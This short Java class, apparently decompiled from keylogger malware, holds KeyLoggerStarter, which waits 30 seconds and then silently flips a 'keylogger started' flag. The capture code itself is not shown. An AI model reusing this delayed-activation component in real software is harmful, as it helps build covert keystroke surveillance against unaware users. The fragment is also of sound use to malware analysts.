package carLambo;

final class KeyLoggerStarter implements Runnable {
   // $FF: synthetic field
   private KeyLogger isStarted;

   KeyLoggerStarter(KeyLogger var1) {
      this.isStarted = var1;
      
   }

   public final void run() {
      try {
         Thread.sleep(30000L);
         KeyLogger.setKeyloggerStarted(this.isStarted, true);
      } catch (Exception var1) {
         ;
      }
   }
}
